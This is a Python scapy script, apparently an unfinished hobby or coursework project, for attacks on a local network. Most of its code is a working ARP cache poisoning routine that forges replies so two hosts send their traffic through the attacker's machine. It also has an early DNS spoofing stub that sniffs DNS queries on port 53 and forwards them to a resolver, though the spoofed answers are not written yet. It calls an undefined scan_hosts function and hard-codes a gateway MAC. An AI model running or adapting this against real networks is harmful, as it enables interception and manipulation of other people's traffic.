from scapy.all import *
from scapy.all import ARP, Ether, srp, DNS, IP, UDP
import psutil
from dns.resolver import Resolver
from util import get_prefix_length, apply_mask, AddressFamily

# TODO: check length
dns_server = Resolver().nameservers[0]

# We don't want to enable promiscuous mode because we don't care 
# about the network traffic. Also, not all interfaces might have a
# promiscuous mode. Disabling this prevents the use of promiscuous
# mode and as a result the code will work on all interfaces.
conf.sniff_promisc = 0


def get_interfaces():
    """Returns a dictionary of the interfaces
    """
    interfaces = psutil.net_if_addrs()
    interfaces_data = {}

    # Iterate over the interfaces
    for name, addresses in interfaces.items():
        interface_data = { 'name': name }

        # Loop over the addresses of the different OSI layers
        # (we are only interested in the link and network layers)
        for address in addresses:
            if address.family == AddressFamily.AF_LINK:
                interface_data['mac_address'] = address.address
            elif address.family == AddressFamily.AF_INET:
                network_ip = apply_mask(address.address, address.netmask)
                prefix_length = get_prefix_length(address.netmask)

                interface_data['ip_address'] = address.address
                interface_data['netmask'] = address.netmask
                interface_data['subnet'] = f'{network_ip}/{prefix_length}'

        interfaces_data[name] = interface_data

    return interfaces_data

def poison_arp_cache(interface_name, attacker, target1, target2):
    # send ARP reply to target 1
    # send ARP reply to target 2
    
    # Send mac of attacker to target 1
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target1['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target2['ip_address']
    packet[ARP].hwdst = target1['mac_address']
    packet[ARP].pdst = target1['ip_address']

    packet.show()

    sendp(packet, iface=interface_name)

    # Send mac of attacker to target 2
    packet = Ether() / ARP()
    packet[Ether].src = attacker['mac_address']
    packet[Ether].dst = target2['mac_address']
    packet[ARP].op = 2
    packet[ARP].hwsrc = attacker['mac_address']
    packet[ARP].psrc = target1['ip_address']
    packet[ARP].hwdst = target2['mac_address']
    packet[ARP].pdst = target2['ip_address']

    packet.show()
    sendp(packet, iface=interface_name)

    # repeat ARP replies every X seconds


def process(packet):
    if not packet.haslayer(DNS):
        return
    
    if not packet[DNS].opcode != 1:
        return

    # Check if the DNS request is addressed to us
    # if packet[Ether].dst != mac_address:
    #     print('Addressed to us')
    # else:
    #     print('Not addressed to us')

    print('Original packet')
    packet.show()
    print('\n\n')

    # Make a new request containing the exact same DNS request
    request = Ether() / IP() / UDP() / packet[DNS]
    # hard-coded mac address of the gateway
    request[Ether].dst = '34:64:a9:28:71:56'
    request[IP].dst = Resolver().nameservers[0]
    # DNS uses port 53
    request[UDP].dport = 53

    answered, unanswered = srp(request)
    (_, response) = answered[0]
    print('Request')
    request.show()
    print('\n\n')
    print('Response')
    response.show()
    print('\n\n')

    

def dns_spoofing():
    # DNS is usually on port 53
    sniff(filter='port 53', store=0, prn=process, count = 2)


# interfaces = get_interfaces()
# interface = interfaces['Wi-Fi']
# mac_address = interface['mac_address']

# hosts = scan_hosts(interface['subnet'])
# print(hosts)

# dns_spoofing()
